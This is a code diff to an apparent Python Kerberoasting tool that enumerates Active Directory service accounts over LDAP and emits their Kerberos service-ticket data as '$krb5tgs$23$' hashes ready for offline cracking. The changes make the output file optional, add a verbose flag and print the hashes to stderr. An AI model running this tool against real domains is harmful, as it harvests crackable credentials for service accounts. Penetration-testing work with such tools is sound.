@@ -76,6 +76,8 @@ P = '\033[35m'  # purple
 C = '\033[36m'  # cyan
 GR = '\033[37m'  # gray
 
+verbose_level = 0
+
 class AttackParameters():
     def __init__(self, user_account = None, realm = None,
                 DC_addr = None, password = None,
@@ -167,14 +169,18 @@ class AttackParameters():
     def TGS_attack(self):
         WRITE_STDERR('\n' + P + '[+] Iterating through SPN and building '\
                     + "corresponding TGS-REQ\n" + W)
-        try:
-            outputfile = open(self.outputfile_path,'w')
-        except:
-            WRITE_STDERR(' cannot open \'%s\' exiting. \n' % self.outputfile_path)
-            exit()
+        
+        if self.outputfile_path != None:
+            try:
+                outputfile = open(self.outputfile_path,'w')
+            except:
+                WRITE_STDERR(' cannot open \'%s\' exiting. \n' % self.outputfile_path)
+                exit()
 
         # Iterate through list_spn and forge TGS
         target_service = target_host = ""
+        existing_SPN = 0
+
         for accounts in self.list_spn:
             spn = accounts['serviceprincipalname']
             samaccountname = accounts['samaccountname']
@@ -200,30 +206,44 @@ class AttackParameters():
 
             # horrible asn1 structure...
             c=""
+
             for i in tgs_rep['ticket']['enc-part']['cipher'].asNumbers():
                 # zfill make sure a leading '0' is added when needed
                 c =c + hex(i).replace("0x",'').zfill(2)
-            WRITE_STDERR(c + '\n\n')
-            outputfile.write("$krb5tgs$23$*" + samaccountname + "$"\
-            + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
-            + c[:32] + "$" + c[32:] + '\n')
+                existing_SPN = 1
+            
+            sys.stderr.write("$krb5tgs$23$*" + samaccountname + "$"\
+                + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
+                + c[:32] + "$" + c[32:] + '\n')
+            sys.stderr.flush()
+            
+            if self.outputfile_path != None:
+                outputfile.write("$krb5tgs$23$*" + samaccountname + "$"\
+                + self.DC_addr + "$" + target_service + "/" + target_host.split(':')[0] + "*$"\
+                + c[:32] + "$" + c[32:] + '\n')
 
-        outputfile.close()
-        # where are stored SPN
-        dirname = os.path.dirname(self.outputfile_path)
-        # current dir
-        if dirname == '':
-            dirname = './'
-        else:
-            dirname = dirname + '/'
-        filename = os.path.basename(self.outputfile_path)
-        filename = 'SPN_' + filename
+        if self.outputfile_path != None:
+            outputfile.close()
+            # where are stored SPN
+            dirname = os.path.dirname(self.outputfile_path)
+            # current dir
+            if dirname == '':
+                dirname = './'
+            else:
+                dirname = dirname + '/'
+            filename = os.path.basename(self.outputfile_path)
+            filename = 'SPN_' + filename
 
         # All went good!
-        WRITE_STDERR(O + "All done! All tickets are stored in a "\
-        + "ready-to-crack format in " + B + '\'' + self.outputfile_path + '\''\
-        + O + " and SPN are stored in " + B + '\'' + dirname + filename\
-        + '\'\n' + W)
+        if existing_SPN != 0:
+            if self.outputfile_path != None:
+                WRITE_STDERR(O + "All done! All tickets are stored in a "\
+                + "ready-to-crack format in " + B + '\'' + self.outputfile_path + '\''\
+                + O + " and SPN are stored in " + B + '\'' + dirname + filename\
+                + '\'\n' + W)
+        else:
+            sys.stderr.write(O + "There are no accounts with an SPN \n" + W)
+            sys.stderr.flush()
 
     def forge_custom_TGS_REQ(self, target_service, target_host,
                              subkey, nonce, current_time, spn,
@@ -244,8 +264,9 @@ class AttackParameters():
 
 
 def WRITE_STDERR(message):
-    sys.stderr.write(message)
-    sys.stderr.flush()
+    if verbose_level == 1:
+        sys.stderr.write(message)
+        sys.stderr.flush()
 
 
 def ldap_get_all_users_spn(AttackParameters, port):
@@ -314,16 +335,17 @@ def ldap_get_all_users_spn(AttackParameters, port):
     WRITE_STDERR('  [+] Retrieving all SPN and corresponding accounts...')
 
     # construct path to SPN_outfile to store LDAP response
-    outputfile_spn = ""
-    dirname = os.path.dirname(AttackParameters.outputfile_path)
-    # current dir
-    if dirname == '':
-        dirname = './'
-    else:
-        dirname = dirname + '/'
-    filename = os.path.basename(AttackParameters.outputfile_path)
-    filename = 'SPN_' + filename
-    outputfile_spn = open(dirname + filename, 'w')
+    if AttackParameters.outputfile_path != None:
+        outputfile_spn = ""
+        dirname = os.path.dirname(AttackParameters.outputfile_path)
+        # current dir
+        if dirname == '':
+            dirname = './'
+        else:
+            dirname = dirname + '/'
+        filename = os.path.basename(AttackParameters.outputfile_path)
+        filename = 'SPN_' + filename
+        outputfile_spn = open(dirname + filename, 'w')
 
     # iterate through results to construc dico[{'attribute':'value'},{}, etc.] for each "{}" account
     dico_users_spn = []
@@ -350,16 +372,17 @@ def ldap_get_all_users_spn(AttackParameters, port):
                  + AttackParameters.DC_addr + '\'\n' + W)
 
     # write to SPN_outputfile
-    for accounts in dico_users_spn:
-        line_to_write = accounts['samaccountname']+'$'\
-                        +accounts['serviceprincipalname']
-        if accounts.has_key('memberof'):
-            line_to_write = line_to_write + '$' + accounts['memberof']
-        if accounts.has_key('primarygroupid'):
-            line_to_write = line_to_write + '$primaryGroupID:'\
-                            + accounts['primarygroupid']
-        outputfile_spn.write(line_to_write + '\n')
-    outputfile_spn.close()
+    if AttackParameters.outputfile_path != None:
+        for accounts in dico_users_spn:
+            line_to_write = accounts['samaccountname']+'$'\
+                            +accounts['serviceprincipalname']
+            if accounts.has_key('memberof'):
+                line_to_write = line_to_write + '$' + accounts['memberof']
+            if accounts.has_key('primarygroupid'):
+                line_to_write = line_to_write + '$primaryGroupID:'\
+                                + accounts['primarygroupid']
+            outputfile_spn.write(line_to_write + '\n')
+        outputfile_spn.close()
 
     return dico_users_spn
 
@@ -409,7 +432,7 @@ def parse_arguments():
     Controler FQDN. Can be an IP but ldap retrieval through kerberos method will not\
     work (-k)")
 
-    parser.add_argument('-o', '--outputfile', required=True, help="outputfile where\
+    parser.add_argument('-o', '--outputfile', required=False, help="outputfile where\
     to store results")
 
     parser.add_argument('-iK', '--input_TGT_File', required=False, help="user's provided file\
@@ -421,6 +444,9 @@ def parse_arguments():
 
     group.add_argument('--hash', required=False, help="user's hash key. Format is \"LM:NT\".\
     Cannot be used with '-p'")
+
+    parser.add_argument('-v', '--verbose', required=False, action='store_const', const=1,
+    help="increase verbosity level")
 
     group2.add_argument('-k', '--user_sid', required=False, help="force ldap SPN\
     retrieval through kerberos, sid is mandatory. Cannot be used with '-i'")
@@ -487,6 +513,9 @@ if __name__ == '__main__':
     if options.input_TGT_File :
         DataSubmitted.Parse_TGT_File(options.input_TGT_File)
 
+    if options.verbose:
+        verbose_level = 1
+        
     # launching attack!
 
     # file containing SPN is provided
